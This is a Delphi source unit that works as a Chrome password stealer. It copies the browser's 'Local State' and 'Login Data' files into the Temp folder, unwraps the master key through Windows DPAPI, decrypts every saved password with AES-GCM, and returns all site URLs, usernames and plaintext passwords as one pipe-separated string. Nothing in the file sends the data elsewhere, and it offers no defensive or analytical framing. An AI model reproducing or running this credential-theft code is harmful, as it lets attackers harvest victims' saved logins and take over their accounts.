unit Chromium;

interface

uses Windows, SysUtils, StrUtils, ShlObj, NetEncoding, Classes;
function GetBrowser: String;

implementation

uses System.JSON, System.IOUtils,
  FireDAC.Stan.Intf, FireDAC.Stan.Option, FireDAC.Stan.Error, FireDAC.UI.Intf,
  FireDAC.Phys.Intf, FireDAC.Stan.Def, FireDAC.Stan.Pool, FireDAC.Stan.Async,
  FireDAC.Phys, FireDAC.Stan.Param, FireDAC.DatS, FireDAC.DApt.Intf,
  FireDAC.DApt, FireDAC.VCLUI.Wait, FireDAC.Comp.UI, Data.DB,
  FireDAC.Comp.DataSet, FireDAC.Comp.Client, FireDAC.Phys.SQLite,mormot.crypt.core;

type
  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: PWideChar;
  end;

  CRYPTPROTECT_PROMPTSTRUCT = _CRYPTPROTECT_PROMPTSTRUCT;
  PCRYPTPROTECT_PROMPTSTRUCT = ^CRYPTPROTECT_PROMPTSTRUCT;

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PPWideChar;
  pOptionalEntropy: PDATA_BLOB; pReserved: Pointer;
  pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT; dwFlags: DWORD;
  pDataOut: PDATA_BLOB): BOOL; stdcall; external 'Crypt32.dll';

function dpApiUnprotectData(fpDataIn: tBytes): tBytes;
var
  DataIn, DataOut: DATA_BLOB;
begin
  DataOut.cbData := 0;
  DataOut.pbData := nil;

  DataIn.cbData := Length(fpDataIn);
  DataIn.pbData := @fpDataIn[0];

  if not CryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut) then
    RaiseLastOSError;

  setLength(Result, DataOut.cbData);
  Move(DataOut.pbData^, Result[0], DataOut.cbData);
  LocalFree(HLOCAL(DataOut.pbData));
end;

function Convert(const Bytes: tBytes): RawByteString;
begin
  setLength(Result, Length(Bytes));
  Move(Bytes[0], Result[1], Length(Bytes))
end;

function GetLocalState_Dir: String;
var
  Local_FilePath, Roaming_FilePath: array [0 .. MAX_PATH] of Char;
begin
  Result := '';
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, 0, Local_FilePath);

  CopyFile(PChar(Local_FilePath + '\Google\Chrome\User Data\Local State'),
    PChar(Local_FilePath + '\Temp\Google_Chrome State'), true);
  Result := PChar(Local_FilePath + '\Temp\Google_Chrome State');
end;

function GetLoginData_Dir: String;
var
  Local_FilePath, Roaming_FilePath: array [0 .. MAX_PATH] of Char;
begin
  Result := '';
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, 0, Local_FilePath);

  CopyFile(PChar(Local_FilePath +
    '\Google\Chrome\User Data\Default\Login Data'),
    PChar(Local_FilePath + '\Temp\Google_Chrome Data'), true);
  Result := PChar(Local_FilePath + '\Temp\Google_Chrome Data')
end;

function GetPassword(MasterKey, Password: tBytes): String;
var
  AES_GCM: TAesGcmEngine;
  Key: array [0 .. 31] of Byte; // 256-bit key (32 bytes)
  IV: array [0 .. 11] of Byte; // 96-bit nonce (12 bytes)
  CipherText: tBytes;
  Tag: TAesBlock; // Tag for authentication (16 bytes)
  DecryptedText: tBytes;
  IVTemp: tBytes;
begin
  // Master key operations
  Delete(MasterKey, 0, 5);
  MasterKey := dpApiUnprotectData(MasterKey);
  Move(MasterKey[0], Key[0], SizeOf(Key));

  // Extract IV (nonce) from the Password
  IVTemp := Copy(Password, 3, 12);
  // Copy IV (nonce) from password starting from index 3, 12 bytes
  Move(IVTemp[0], IV[0], SizeOf(IV));

  // Prepare CipherText
  Delete(Password, 0, 15);
  // Remove first 15 bytes from Password to get the CipherText
  CipherText := Password;


  // Extract the authentication tag from the last 16 bytes of CipherText
  if Length(CipherText) < 16 then
    raise Exception.Create('CipherText is too short to contain a valid tag');

  Move(CipherText[Length(CipherText) - 16], Tag, SizeOf(Tag));
  setLength(CipherText, Length(CipherText) - 16);
  // Adjust CipherText length by removing the tag



  // Initialize AES-GCM with the Key and IV
  AES_GCM.Init(Key, 256);
  AES_GCM.Reset(@IV, SizeOf(IV));

  // Prepare the decrypted text buffer
  setLength(DecryptedText, Length(CipherText));

  // Decrypt the CipherText using AES-GCM
  AES_GCM.Decrypt(CipherText, DecryptedText, Length(CipherText), @Tag,
    SizeOf(Tag));


  // Return the decrypted string
  Result := TEncoding.UTF8.GetString(DecryptedText);
end;

function GetBrowser: String;
var
  EncryptedMasterKey: string;
  FDConnection: TFDConnection;
  FDQuery: TFDQuery;
  JsonValue: TJSONObject;
  OriginURL, Username, Password: string;
begin
  Result := '';

  // Read and parse the local state JSON file
  JsonValue := TJSONObject.ParseJSONValue(TFile.ReadAllText(GetLocalState_Dir)) as TJSONObject;
  try
    EncryptedMasterKey := JsonValue.GetValue<TJSONObject>('os_crypt')
      .GetValue<string>('encrypted_key').Replace('"', '');
  finally
    JsonValue.Free;
  end;

  FDConnection := TFDConnection.Create(nil);
  try
    FDConnection.Params.Clear;
    FDConnection.Params.DriverID := 'SQLite';
    FDConnection.Params.Database := GetLoginData_Dir;

    // Check if the database path is correctly set
    if FDConnection.Params.Database = '' then
    begin
      Result := 'Database path is unknown or invalid';
      Exit;
    end;

    FDQuery := TFDQuery.Create(nil);
    try
      FDQuery.Connection := FDConnection;
      FDQuery.SQL.Text := 'SELECT origin_url, username_value, password_value FROM logins';
      FDQuery.Open;

      // Ensure that the query returned rows
      if FDQuery.RecordCount = 0 then
      begin
        Result := 'No records found in the logins table';
        Exit;
      end;

      // Loop through all rows
      while not FDQuery.Eof do
      begin
        OriginURL := FDQuery.FieldByName('origin_url').AsString;
        Username := FDQuery.FieldByName('username_value').AsString;
        Password := FDQuery.FieldByName('password_value').AsString;

        Result := Result + OriginURL + '|' + Username + '|';

        if Password <> '' then
          Result := Result + GetPassword(TNetEncoding.Base64.DecodeStringToBytes(EncryptedMasterKey), FDQuery.FieldByName('password_value').AsBytes) + '|';

        FDQuery.Next;
      end;

      // Remove the trailing '|'
      if Result.EndsWith('|') then
        SetLength(Result, Length(Result) - 1);

    finally
      FDQuery.Free;
    end;
  finally
    FDConnection.Free;
  end;
end;



end.
